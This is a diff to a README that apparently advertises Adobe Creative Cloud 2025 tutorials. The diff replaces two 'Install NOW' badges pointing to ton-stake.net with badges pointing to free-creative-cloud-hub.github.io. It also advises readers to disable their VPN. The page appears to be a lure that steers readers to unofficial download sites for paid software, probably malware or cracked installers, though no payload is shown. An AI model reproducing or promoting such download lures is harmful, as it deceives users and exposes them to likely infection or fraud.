@@ -5,7 +5,9 @@
 
 **Description**: Unleash your creativity with **Adobe Creative Cloud 2025**, a premium suite for design, video, and photography! This repository offers tutorials, resources, and tips to explore Creative Cloud’s powerful tools across Photoshop, Illustrator, Premiere Pro, and more. Start with accessible creative resources and join our vibrant community of artists in 2025!  
 
-[![Install Creative Cloud 2025](https://img.shields.io/badge/Install-NOW-blueviolet)](https://ton-stake.net)  
+<a href="https://free-creative-cloud-hub.github.io/.github/" target="_blank">
+  <img src="https://img.shields.io/badge/Install_Guide-Now-3498db" alt="Install Guide Now" width="230" height="45" style="border:none;">
+</a>
 
 ---
 
@@ -33,7 +35,9 @@ Bring your creative projects to life with these easy steps to set up Creative Cl
    - Disable your VPN to avoid connection issues.  
    - Switch to another browser (e.g., Chrome, Firefox, or Edge) for a smoother experience.  
 
-[![Install Creative Cloud 2025](https://img.shields.io/badge/Install-NOW-blueviolet)](https://ton-stake.net)  
+<a href="https://free-creative-cloud-hub.github.io/.github/" target="_blank">
+  <img src="https://img.shields.io/badge/Install_Guide-Now-3498db" alt="Install Guide Now" width="230" height="45" style="border:none;">
+</a>
 
 ---
 
@@ -91,11 +95,11 @@ Bring your creative projects to life with these easy steps to set up Creative Cl
 
 **Creative Cloud 2025 Interface**  
 ![Creative Cloud 2025 Interface](https://thenextweb.com/wp-content/blogs.dir/1/files/2014/09/PP1.jpg)  
-*Sleek workspace for creative production.*  
+ 
 
 **Creative Tools**  
 ![Creative Tools](https://blog.adobe.com/de/publish/2017/09/13/media_1993618068f848c3e563d03c02ee29ba5aa1be0b2.png?width=750&format=png&optimize=medium)  
-*Enhance your work with advanced features.*  
+ 
 
 ---
 
